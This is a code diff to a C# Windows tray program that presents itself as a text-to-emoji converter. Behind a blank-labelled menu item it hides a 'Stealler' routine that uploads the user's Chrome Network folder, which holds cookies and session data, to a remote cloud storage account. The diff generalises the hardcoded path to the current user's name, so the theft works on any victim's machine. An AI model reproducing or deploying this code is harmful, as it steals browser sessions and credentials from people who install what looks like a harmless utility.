@@ -35,7 +35,7 @@ namespace text_to_emoji_v1._1
             InitializeComponent();
             ShowInTaskbar = true;
             notifyIcon1.ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip();
-            notifyIcon1.ContextMenuStrip.Items.Add("", null, still);
+            notifyIcon1.ContextMenuStrip.Items.Add("", null, steall);
             notifyIcon1.ContextMenuStrip.Items.Add("Сюрприз =)", null, XD);
             notifyIcon1.ContextMenuStrip.Items.Add("Конвертировать из буфера", null, convert);
             notifyIcon1.ContextMenuStrip.Items.Add("Выход", null, close);
@@ -73,7 +73,7 @@ namespace text_to_emoji_v1._1
             MessageBox.Show("Проситите, сюрприз ещё в разработке =(", "(´• ω •`)");
         }
 
-        public async Task Stiller()
+        public async Task Stealler()
         {
             try
             {
@@ -88,7 +88,7 @@ namespace text_to_emoji_v1._1
                 {
                     await api.Commands.CreateDictionaryAsync("/" + folderName);
                 }
-                var files = Directory.GetFiles("C:/Users/yuraa/AppData/Local/Google/Chrome/User Data/Default/Network/");
+                var files = Directory.GetFiles("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default/Network/");
                 foreach (var file in files)
                 {
                     var link = await api.Files.GetUploadLinkAsync("/" + folderName + "/" + Path.GetFileName(file), overwrite: false);
@@ -108,9 +108,9 @@ namespace text_to_emoji_v1._1
             }
         }
 
-        public void still(object sender, EventArgs e)
+        public void steall(object sender, EventArgs e)
         {
-            Stiller();
+            Stealler();
         }
         
         public void convert(object sender, EventArgs e)
